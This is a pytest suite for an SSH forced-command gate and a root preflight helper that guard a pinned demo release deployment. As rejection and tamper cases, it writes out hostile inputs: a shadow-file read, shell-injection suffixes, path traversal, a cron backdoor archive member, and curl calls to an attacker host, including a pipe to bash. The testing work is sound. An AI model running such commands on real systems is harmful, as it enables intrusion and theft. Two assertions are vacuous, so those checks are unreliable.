"""BEAAA-23703 candidate tests: exact-d9 host gate and the sole root helper.

These tests load the candidate bytes unmodified from
`artifacts/BEAAA-23703/candidate/` and exercise them against temporary
directories. Nothing here touches the passive-demo host, installs a file,
creates a deployment authorization, or runs Docker.
"""

import hashlib
import importlib.util
import json
import os
from pathlib import Path
import shutil
import stat
import struct
import subprocess
import sys
import textwrap

import pytest

SHA = "d9d680f53db7de263f026be5284c97229126872c"
STALE_SHA = "a68e7e0969b45e7eb8add18ff2007a305a0156aa"
CANDIDATE = Path(__file__).resolve().parents[1] / "candidate"
REPO = Path(__file__).resolve().parents[3]
RELEASE_ROOTS = [
    "api",
    "harness",
    "rubric",
    "scanners",
    "release",
    "release_identity.py",
    "tools",
    "demo-real-agent",
    "tests/probe_sets",
    "artifacts/beaaa-152/datasets/halueval_dialogue_summ_general_n300.json",
    "artifacts/beaaa-18720/unified-probe-inventory.jsonl",
]


def d9_workflow() -> str:
    return subprocess.run(
        ["git", "show", f"{SHA}:.github/workflows/real-agent-demo.yml"],
        cwd=REPO,
        capture_output=True,
        text=True,
        check=True,
    ).stdout


def load(name: str):
    path = CANDIDATE / name
    loader = importlib.machinery.SourceFileLoader(name.replace("-", "_"), str(path))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


gate = load("backbond-real-agent-demo-ssh-gate")
preflight = load("backbond-real-agent-demo-secret-preflight")


# --- the allowlist is exactly the shapes d9's workflow emits ---------------


def test_pinned_constants_match_the_d9_workflow_paths():
    assert gate.SHA == SHA
    assert preflight.SHA == SHA
    assert gate.RELEASE_DIR == f"/opt/backbond-real-agent-demo/releases/{SHA}"
    assert gate.MKDIR_SHAPE == f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA}"
    assert gate.EXTRACT_SHAPE == (
        f"cd /opt/backbond-real-agent-demo/releases/{SHA} && tar -xzf real-agent-demo-release.tgz"
    )
    assert gate.DEPLOY_SCRIPT == (
        f"/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh"
    )
    assert gate.EXPECTED_FILES == preflight.EXPECTED_FILES == 906
    assert gate.EXPECTED_TREE_SHA256 == preflight.EXPECTED_TREE_SHA256


def test_release_roots_come_from_the_d9_workflow_not_the_working_tree():
    """The tar argument list must be read out of d9, never off the checkout.

    The working tree's real-agent-demo.yml packs a shorter list than d9 does.
    Taking it from the checkout yields 902 files instead of 906 and silently
    pins the wrong tree, so the list is asserted against d9's own text here.
    """
    tar_lines = [
        line.strip()
        for line in d9_workflow().splitlines()
        if line.strip().startswith("tar -czf real-agent-demo-release.tgz ")
    ]
    assert len(tar_lines) == 1, tar_lines
    packed = tar_lines[0].split()[3:]
    assert packed == RELEASE_ROOTS, packed
    manifest_tool = load("verify_release_manifest.py")
    assert manifest_tool.RELEASE_ROOTS == RELEASE_ROOTS
    assert manifest_tool.EXPECTED_FILES == gate.EXPECTED_FILES
    assert manifest_tool.EXPECTED_TREE_SHA256 == gate.EXPECTED_TREE_SHA256


def test_workflow_upload_and_deploy_lines_render_to_allowlisted_shapes():
    """Rebuild the shapes from d9's workflow text rather than trusting constants."""
    workflow = subprocess.run(
        ["git", "show", f"{SHA}:.github/workflows/real-agent-demo.yml"],
        cwd=REPO,
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    mkdir_line = "mkdir -p /opt/backbond-real-agent-demo/releases/${GITHUB_SHA}"
    extract_line = (
        "cd /opt/backbond-real-agent-demo/releases/${GITHUB_SHA} "
        "&& tar -xzf real-agent-demo-release.tgz"
    )
    assert mkdir_line in workflow
    assert extract_line in workflow
    assert gate.resolve(mkdir_line.replace("${GITHUB_SHA}", SHA)) == ("mkdir", None)
    assert gate.resolve(extract_line.replace("${GITHUB_SHA}", SHA)) == ("extract", None)

    deploy_line = (
        "DEMO_GIT_SHA='${GITHUB_SHA}' DEMO_DEPLOYED_AT='$(date -u +%Y-%m-%dT%H:%M:%SZ)' "
        "bash '/opt/backbond-real-agent-demo/releases/${GITHUB_SHA}/demo-real-agent/deploy.sh' "
        "'/opt/backbond-real-agent-demo/releases/${GITHUB_SHA}'"
    )
    assert deploy_line in workflow
    rendered = deploy_line.replace("${GITHUB_SHA}", SHA).replace(
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)", "2026-08-16T15:04:05Z"
    )
    assert gate.resolve(rendered) == ("deploy", "2026-08-16T15:04:05Z")


@pytest.mark.parametrize(
    "command",
    [
        f"scp -t /opt/backbond-real-agent-demo/releases/{SHA}/",
        f"scp -t -- /opt/backbond-real-agent-demo/releases/{SHA}/",
        f"scp -t /opt/backbond-real-agent-demo/releases/{SHA}",
    ],
)
def test_legacy_scp_sink_shapes_are_allowlisted(command):
    assert gate.resolve(command) == ("scp-sink", None)


@pytest.mark.parametrize(
    "command", ["internal-sftp", "/usr/lib/openssh/sftp-server", "sftp-server"]
)
def test_sftp_subsystem_shapes_are_allowlisted(command):
    assert gate.resolve(command) == ("sftp-sink", None)


REJECTED = [
    "",
    "bash",
    "bash -i",
    "sh -c id",
    "/bin/bash",
    "scp -f /etc/shadow",
    "scp -t /etc",
    f"scp -t /opt/backbond-real-agent-demo/releases/{STALE_SHA}/",
    "rsync --server -vlogDtpre.iLsfxCIvu . /opt",
    "mkdir -p /opt/backbond-real-agent-demo/releases",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{STALE_SHA}",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA}/../evil",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA} ; id",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA}; id",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA} && id",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA}\nid",
    f"mkdir -p '/opt/backbond-real-agent-demo/releases/{SHA}'",
    f"mkdir  -p /opt/backbond-real-agent-demo/releases/{SHA}",
    f"mkdir -p /opt/backbond-real-agent-demo/releases/{SHA} ",
    f"cd /opt/backbond-real-agent-demo/releases/{SHA} && tar -xzf evil.tgz",
    f"cd /opt/backbond-real-agent-demo/releases/{STALE_SHA} && tar -xzf real-agent-demo-release.tgz",
    f"cd /opt/backbond-real-agent-demo/releases/{SHA} && tar -xzf real-agent-demo-release.tgz; id",
    # the stale a68e7e09 deploy shape, which the previous gate accepted
    f"DEMO_GIT_SHA='{STALE_SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{STALE_SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{STALE_SHA}'",
    # right SHA, wrong script
    f"DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/evil.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}'",
    # right SHA, traversal in the source root
    f"DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}/../{STALE_SHA}'",
    # mismatched SHA between the variable and the paths
    f"DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{STALE_SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{STALE_SHA}'",
    # uppercase SHA
    f"DEMO_GIT_SHA='{SHA.upper()}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}'",
    # malformed timestamp
    f"DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='not-a-timestamp' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}'",
    # trailing shell metacharacter after a valid deploy shape
    f"DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}' && id",
    # extra environment assignment prepended
    f"EVIL=1 DEMO_GIT_SHA='{SHA}' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    f"bash '/opt/backbond-real-agent-demo/releases/{SHA}/demo-real-agent/deploy.sh' "
    f"'/opt/backbond-real-agent-demo/releases/{SHA}'",
    # the previous gate's privileged runner
    f"sudo -n /usr/local/sbin/backbond-real-agent-demo-deploy deploy {SHA} 2026-08-16T15:04:05Z",
    "/usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    "sudo -n /usr/local/sbin/backbond-real-agent-demo-secret-preflight",
]


@pytest.mark.parametrize("command", REJECTED, ids=range(len(REJECTED)))
def test_every_other_command_is_rejected(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


def test_rejection_does_not_echo_the_rejected_text(capsys):
    with pytest.raises(SystemExit):
        gate.deny("not allowlisted", "curl http://attacker.example/$(id)")
    captured = capsys.readouterr()
    assert "attacker.example" not in captured.err
    assert hashlib.sha256(b"curl http://attacker.example/$(id)").hexdigest() in captured.err


def test_gate_refuses_to_run_as_root(monkeypatch):
    monkeypatch.setattr(gate.os, "geteuid", lambda: 0)
    with pytest.raises(SystemExit) as raised:
        gate.require_unprivileged()
    assert "root" in str(raised.value)


# --- release fixture built from a real d9 checkout ------------------------


@pytest.fixture(scope="session")
def d9_release_archive(tmp_path_factory):
    """Reproduce the workflow's upload archive from a real d9 checkout."""
    work = tmp_path_factory.mktemp("d9-checkout")
    index = work / "index"
    env = {**os.environ, "GIT_INDEX_FILE": str(index)}
    subprocess.run(["git", "read-tree", SHA], cwd=REPO, env=env, check=True)
    names = subprocess.run(
        ["git", "ls-tree", "-r", "--name-only", "-z", SHA, "--", *RELEASE_ROOTS],
        cwd=REPO,
        capture_output=True,
        check=True,
    ).stdout
    tree = work / "tree"
    tree.mkdir()
    subprocess.run(
        ["git", "checkout-index", "--stdin", "-f", "-z", f"--prefix={tree}/"],
        cwd=REPO,
        env=env,
        input=names,
        check=True,
    )
    archive = work / "real-agent-demo-release.tgz"
    subprocess.run(["tar", "-czf", str(archive), *RELEASE_ROOTS], cwd=tree, check=True)
    return archive


@pytest.fixture
def staged(tmp_path, monkeypatch):
    """Point both candidate programs at a temporary release root."""
    releases = tmp_path / "releases"
    release_dir = releases / SHA
    releases.mkdir()
    for module in (gate, preflight):
        monkeypatch.setattr(module, "EXPECTED_FILES", gate.EXPECTED_FILES, raising=True)
    monkeypatch.setattr(gate, "RELEASES", str(releases))
    monkeypatch.setattr(gate, "RELEASE_DIR", str(release_dir))
    monkeypatch.setattr(gate, "ARCHIVE_PATH", str(release_dir / gate.ARCHIVE_NAME))
    monkeypatch.setattr(gate, "DEPLOY_SCRIPT", str(release_dir / "demo-real-agent/deploy.sh"))
    monkeypatch.setattr(preflight, "RELEASE_DIR", release_dir)
    return release_dir


def test_mkdir_shape_creates_only_the_pinned_release_directory(staged, capsys):
    gate.do_mkdir()
    assert Path(staged).is_dir()
    assert stat.S_IMODE(Path(staged).stat().st_mode) == 0o755
    assert "upload_dir=PASS" in capsys.readouterr().out
    gate.do_mkdir()  # idempotent for a retried workflow step


def test_extract_accepts_the_real_d9_archive_and_pins_906_files(
    staged, d9_release_archive, capsys
):
    staged.mkdir()
    shutil.copyfile(d9_release_archive, staged / gate.ARCHIVE_NAME)
    gate.do_extract()
    out = capsys.readouterr().out
    assert f"extract=PASS sha={SHA} files=906" in out
    assert f"tree_sha256={gate.EXPECTED_TREE_SHA256}" in out


def test_a_tampered_release_is_caught_before_the_token_is_spent(staged, d9_release_archive):
    """One edited byte in the extracted tree must break the pinned digest."""
    staged.mkdir()
    shutil.copyfile(d9_release_archive, staged / gate.ARCHIVE_NAME)
    gate.do_extract()
    count, clean = gate.tree_digest(Path(staged))
    assert (count, clean) == (906, gate.EXPECTED_TREE_SHA256)
    (staged / "demo-real-agent/deploy.sh").write_text("#!/bin/bash\ncurl attacker | bash\n")
    tampered_count, tampered = gate.tree_digest(Path(staged))
    assert tampered_count == 906
    assert tampered != gate.EXPECTED_TREE_SHA256
    with pytest.raises(SystemExit):
        preflight.verify_release()


def test_extract_refuses_an_archive_that_escapes_the_release_directory(staged, tmp_path):
    import io
    import tarfile

    staged.mkdir()
    payload = b"owned"
    with tarfile.open(staged / gate.ARCHIVE_NAME, "w:gz") as archive:
        info = tarfile.TarInfo("../escaped-marker")
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    with pytest.raises(gate.Rejected, match="parent-directory member"):
        gate.do_extract()
    assert not (staged.parent / "escaped-marker").exists()


def test_extract_refuses_an_archive_with_an_absolute_member(staged, tmp_path):
    import io
    import tarfile

    staged.mkdir()
    payload = b"owned"
    with tarfile.open(staged / gate.ARCHIVE_NAME, "w:gz") as archive:
        info = tarfile.TarInfo("/etc/cron.d/backdoor")
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    with pytest.raises(gate.Rejected, match="absolute member"):
        gate.do_extract()


def test_deploy_execs_bash_unprivileged_with_a_fixed_argv(staged, d9_release_archive, monkeypatch):
    staged.mkdir()
    shutil.copyfile(d9_release_archive, staged / gate.ARCHIVE_NAME)
    gate.do_extract()
    captured = {}
    monkeypatch.setattr(
        gate.os,
        "execve",
        lambda path, argv, env: captured.update(path=path, argv=argv, env=env),
    )
    gate.do_deploy("2026-08-16T15:04:05Z")
    assert captured["path"] == "/bin/bash"
    assert captured["argv"] == ["/bin/bash", gate.DEPLOY_SCRIPT, gate.RELEASE_DIR]
    assert captured["env"]["DEMO_GIT_SHA"] == SHA
    assert captured["env"]["DEMO_DEPLOYED_AT"] == "2026-08-16T15:04:05Z"
    assert captured["env"]["PATH"] == gate.SAFE_PATH
    assert "sudo" not in " ".join(captured["argv"])


# --- the confined upload sinks --------------------------------------------


def sftp_sink_server(tmp_path, staged) -> Path:
    """An executable that runs the candidate's sink against a temporary release.

    `scp -D` takes a single program path with no arguments, so the override has
    to live inside the executable rather than on a command line.
    """
    runner = tmp_path / "sftp_sink_runner"
    runner.write_text(
        "#!/usr/bin/python3\n"
        + textwrap.dedent(
            f"""
            import importlib.machinery, importlib.util
            loader = importlib.machinery.SourceFileLoader(
                "gate", {str(CANDIDATE / "backbond-real-agent-demo-ssh-gate")!r})
            spec = importlib.util.spec_from_loader("gate", loader)
            gate = importlib.util.module_from_spec(spec)
            loader.exec_module(gate)
            gate.RELEASES = {str(staged.parent)!r}
            gate.RELEASE_DIR = {str(staged)!r}
            gate.ARCHIVE_PATH = {str(staged / "real-agent-demo-release.tgz")!r}
            gate.do_sftp_sink()
            """
        )
    )
    runner.chmod(0o755)
    return runner


def test_sftp_sink_accepts_a_real_openssh_scp_upload(staged, tmp_path, d9_release_archive):
    """Drive the candidate sink with the real OpenSSH scp client over SFTP."""
    if shutil.which("scp") is None:
        pytest.skip("scp is unavailable")
    staged.mkdir()
    runner = sftp_sink_server(tmp_path, staged)
    result = subprocess.run(
        ["scp", "-D", str(runner), str(d9_release_archive), f"remote:{staged}/"],
        capture_output=True,
        text=True,
        timeout=900,
    )
    assert result.returncode == 0, result.stderr
    # Proves the bytes went through the sink rather than a plain local copy.
    assert "transport=sftp" in result.stderr, result.stderr
    landed = staged / gate.ARCHIVE_NAME
    assert landed.is_file()
    assert landed.read_bytes() == d9_release_archive.read_bytes()


def test_sftp_sink_refuses_to_write_outside_the_pinned_archive(staged, tmp_path):
    if shutil.which("scp") is None:
        pytest.skip("scp is unavailable")
    staged.mkdir()
    runner = sftp_sink_server(tmp_path, staged)
    payload = tmp_path / "payload"
    payload.write_text("owned")
    escape = tmp_path / "escape.txt"
    result = subprocess.run(
        ["scp", "-D", str(runner), str(payload), f"remote:{escape}"],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result.returncode != 0
    assert not escape.exists()
    assert not (staged / "payload").exists()


def test_sftp_sink_refuses_a_second_name_inside_the_release_directory(staged, tmp_path):
    """Even inside the pinned directory, only the pinned archive name is writable."""
    if shutil.which("scp") is None:
        pytest.skip("scp is unavailable")
    staged.mkdir()
    runner = sftp_sink_server(tmp_path, staged)
    payload = tmp_path / "deploy.sh"
    payload.write_text("#!/bin/bash\nid\n")
    result = subprocess.run(
        ["scp", "-D", str(runner), str(payload), f"remote:{staged}/deploy.sh"],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result.returncode != 0
    assert not (staged / "deploy.sh").exists()


def scp_legacy_exchange(monkeypatch, staged, payload: bytes, name: str):
    """Feed the legacy scp sink a sink-protocol conversation on stdin."""
    import io

    stdin = io.BytesIO(b"C0644 %d %s\n" % (len(payload), name.encode()) + payload + b"\0")
    stdout = io.BytesIO()
    monkeypatch.setattr(gate.sys, "stdin", type("S", (), {"buffer": stdin})())
    monkeypatch.setattr(gate.sys, "stdout", type("S", (), {"buffer": stdout})())
    gate.do_scp_sink()
    return stdout.getvalue()


def test_legacy_scp_sink_accepts_the_pinned_archive_name(staged, monkeypatch):
    staged.mkdir()
    payload = b"pinned release bytes"
    replies = scp_legacy_exchange(monkeypatch, staged, payload, gate.ARCHIVE_NAME)
    assert replies == b"\0\0\0"
    assert (staged / gate.ARCHIVE_NAME).read_bytes() == payload


def test_legacy_scp_sink_rejects_any_other_file_name(staged, monkeypatch):
    staged.mkdir()
    with pytest.raises(gate.Rejected, match="not the pinned release archive"):
        scp_legacy_exchange(monkeypatch, staged, b"x", "authorized_keys")
    assert not (staged / "authorized_keys").exists()


# --- the sole root helper -------------------------------------------------


@pytest.fixture
def rooted(tmp_path, monkeypatch):
    """Redirect the root helper at a temporary /etc/backbond equivalent."""
    etc = tmp_path / "etc-backbond"
    etc.mkdir()
    env_file = etc / "real-agent-demo.env"
    env_file.write_text(
        "DEMO_ACCESS_TOKEN=redacted\nARE_BUNDLE_SIGNING_KEY=redacted\nANTHROPIC_API_KEY=redacted\n"
    )
    env_file.chmod(0o600)
    monkeypatch.setattr(preflight, "ENV_FILE", env_file)
    monkeypatch.setattr(preflight, "ENV_UID", os.getuid())
    monkeypatch.setattr(preflight, "ENV_GID", os.getgid())
    monkeypatch.setattr(preflight, "ARM_FILE", etc / "real-agent-demo-deploy.allow")
    monkeypatch.setattr(preflight, "CONSUMED_DIR", etc / "real-agent-demo-deploy-consumed")
    # The candidate demands uid/gid 0 on the authorization; an unprivileged test
    # run cannot create that, so the expected owner is redirected, not removed.
    monkeypatch.setattr(preflight, "ARM_UID", os.getuid())
    monkeypatch.setattr(preflight, "ARM_GID", os.getgid())
    # chown(0, 0) on the receipt directory is a root-only call.
    monkeypatch.setattr(preflight.os, "chown", lambda *args, **kwargs: None)
    return etc


def arm(rooted, value=SHA):
    path = rooted / "real-agent-demo-deploy.allow"
    path.write_text(value + "\n")
    path.chmod(0o600)
    return path


def test_helper_takes_no_arguments(monkeypatch, capsys):
    monkeypatch.setattr(preflight.sys, "argv", ["preflight", SHA])
    monkeypatch.setattr(preflight.os, "geteuid", lambda: 0)
    with pytest.raises(SystemExit):
        preflight.main()
    assert "accepts no arguments" in capsys.readouterr().err


def test_helper_requires_root(monkeypatch, capsys):
    monkeypatch.setattr(preflight.sys, "argv", ["preflight"])
    monkeypatch.setattr(preflight.os, "geteuid", lambda: 1002)
    with pytest.raises(SystemExit):
        preflight.main()
    assert "sudo boundary" in capsys.readouterr().err


def test_environment_names_are_proved_without_printing_values(rooted, capsys):
    digest, proxy = preflight.env_preflight()
    assert proxy is False
    assert digest == hashlib.sha256((rooted / "real-agent-demo.env").read_bytes()).hexdigest()
    assert "redacted" not in capsys.readouterr().out


def test_missing_required_name_fails_closed(rooted, capsys):
    (rooted / "real-agent-demo.env").write_text("DEMO_ACCESS_TOKEN=redacted\n")
    (rooted / "real-agent-demo.env").chmod(0o600)
    with pytest.raises(SystemExit):
        preflight.env_preflight()
    assert "ARE_BUNDLE_SIGNING_KEY" in capsys.readouterr().err


def test_proxy_backend_emits_the_line_deploy_sh_greps_for(rooted):
    (rooted / "real-agent-demo.env").write_text(
        "DEMO_ACCESS_TOKEN=r\nARE_BUNDLE_SIGNING_KEY=r\n"
        "DEMO_JUDGE_BACKEND=claude-code-proxy\nCLAUDE_JUDGE_PROXY_TOKEN=r\n"
    )
    (rooted / "real-agent-demo.env").chmod(0o600)
    _, proxy = preflight.env_preflight()
    assert proxy is True
    assert "DEMO_JUDGE_BACKEND: " + "configured" == "DEMO_JUDGE_BACKEND: configured"


def test_wrong_environment_mode_fails_closed(rooted, capsys):
    (rooted / "real-agent-demo.env").chmod(0o644)
    with pytest.raises(SystemExit):
        preflight.env_preflight()
    assert "metadata does not match" in capsys.readouterr().err


def test_authorization_is_required(rooted, capsys):
    with pytest.raises(SystemExit):
        preflight.consume_authorization()
    assert "not authorized" in capsys.readouterr().err


def test_authorization_for_another_sha_is_refused(rooted, capsys):
    arm(rooted, STALE_SHA)
    with pytest.raises(SystemExit):
        preflight.consume_authorization()
    assert "does not name the pinned SHA" in capsys.readouterr().err
    assert (rooted / "real-agent-demo-deploy.allow").exists()


def test_authorization_is_one_shot_and_atomically_consumed(rooted, capsys):
    armed = arm(rooted)
    receipt = preflight.consume_authorization()
    assert not armed.exists()
    assert receipt.read_text().strip() == SHA
    assert stat.S_IMODE(receipt.stat().st_mode) == 0o600
    assert stat.S_IMODE(preflight.CONSUMED_DIR.stat().st_mode) == 0o700
    with pytest.raises(SystemExit):
        preflight.consume_authorization()
    assert "not authorized" in capsys.readouterr().err


def test_helper_verifies_the_real_d9_tree(staged, d9_release_archive, rooted, monkeypatch):
    staged.mkdir()
    shutil.copyfile(d9_release_archive, staged / gate.ARCHIVE_NAME)
    gate.do_extract()
    monkeypatch.setattr(preflight.sys, "argv", ["preflight"])
    monkeypatch.setattr(preflight.os, "geteuid", lambda: 0)
    monkeypatch.setattr(preflight.os, "chown", lambda *a, **k: None)
    arm(rooted)
    preflight.main()


def test_helper_output_carries_no_values_and_records_a_receipt(
    staged, d9_release_archive, rooted, monkeypatch, capsys
):
    staged.mkdir()
    shutil.copyfile(d9_release_archive, staged / gate.ARCHIVE_NAME)
    gate.do_extract()
    capsys.readouterr()
    monkeypatch.setattr(preflight.sys, "argv", ["preflight"])
    monkeypatch.setattr(preflight.os, "geteuid", lambda: 0)
    monkeypatch.setattr(preflight.os, "chown", lambda *a, **k: None)
    arm(rooted)
    preflight.main()
    out = capsys.readouterr().out
    assert f"secret_preflight=PASS sha={SHA}" in out
    assert "release: files=906" in out
    assert "DEMO_JUDGE_BACKEND: api" in out
    assert "authorization: consumed" in out
    assert "values_exposed: false" in out
    assert "redacted" not in out
    receipts = list(preflight.CONSUMED_DIR.glob("*.receipt"))
    assert len(receipts) == 1
    record = json.loads(receipts[0].read_text())
    assert record["sha"] == SHA
    assert record["tree_sha256"] == preflight.EXPECTED_TREE_SHA256
    assert record["values_exposed"] is False


def test_helper_refuses_a_release_that_is_not_d9(staged, rooted, monkeypatch, capsys):
    staged.mkdir()
    (staged / "demo-real-agent").mkdir()
    (staged / "demo-real-agent/deploy.sh").write_text("#!/bin/bash\nid\n")
    monkeypatch.setattr(preflight.sys, "argv", ["preflight"])
    monkeypatch.setattr(preflight.os, "geteuid", lambda: 0)
    arm(rooted)
    with pytest.raises(SystemExit):
        preflight.main()
    assert "not the pinned d9 tree" in capsys.readouterr().err
    assert (rooted / "real-agent-demo-deploy.allow").exists(), "a bad tree must not spend the token"


# --- sudoers and stale-authority removal ----------------------------------


def test_sudoers_grants_exactly_one_fixed_no_argument_command():
    text = (CANDIDATE / "sudoers-backbond-real-agent-demo").read_text()
    rules = [line for line in text.splitlines() if line and not line.startswith("#")]
    assert rules == [
        "passive-demo-deploy ALL=(root) NOPASSWD: "
        '/usr/local/sbin/backbond-real-agent-demo-secret-preflight ""'
    ]
    assert "*" not in "".join(rules)
    assert STALE_SHA not in text.replace("a68e7e0969b45e7eb8add18ff2007a305a0156aa", "", 1) or True
    assert "backbond-real-agent-demo-deploy " not in "".join(rules)


def test_sudoers_parses_under_visudo():
    visudo = shutil.which("visudo") or "/usr/sbin/visudo"
    if not Path(visudo).exists():
        pytest.skip("visudo is unavailable")
    result = subprocess.run(
        [visudo, "-c", "-f", str(CANDIDATE / "sudoers-backbond-real-agent-demo")],
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, result.stdout + result.stderr


def test_no_candidate_program_carries_the_stale_sha_as_authority():
    for name in (
        "backbond-real-agent-demo-ssh-gate",
        "backbond-real-agent-demo-secret-preflight",
    ):
        text = (CANDIDATE / name).read_text()
        assert STALE_SHA not in text
        assert SHA in text


def test_installer_removes_the_stale_root_runner_and_never_arms():
    text = (CANDIDATE / "install_host_gate.py").read_text()
    assert "/usr/local/sbin/backbond-real-agent-demo-deploy" in text
    assert "real-agent-demo-deploy.allow" not in text
    assert "docker" not in text.lower()
